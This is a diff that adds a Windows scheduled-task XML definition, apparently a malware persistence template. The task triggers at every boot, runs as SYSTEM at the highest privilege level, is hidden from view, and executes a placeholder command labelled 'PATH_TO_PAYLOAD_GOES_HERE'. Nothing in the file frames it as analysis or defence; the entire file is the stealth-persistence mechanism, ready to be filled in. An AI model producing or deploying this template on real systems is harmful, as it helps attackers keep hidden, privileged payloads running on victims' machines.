@@ -1,0 +1,23 @@
+<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+<Triggers>
+    <BootTrigger>
+        <Enabled>true</Enabled>
+    </BootTrigger>
+</Triggers>
+<Principals>
+    <Principal>
+        <UserId>NT AUTHORITY\SYSTEM</UserId>
+        <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+</Principals>
+<Settings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+</Settings>
+<Actions>
+    <Exec>
+        <Command>"PATH_TO_PAYLOAD_GOES_HERE"</Command>
+    </Exec>
+</Actions>
+</Task>
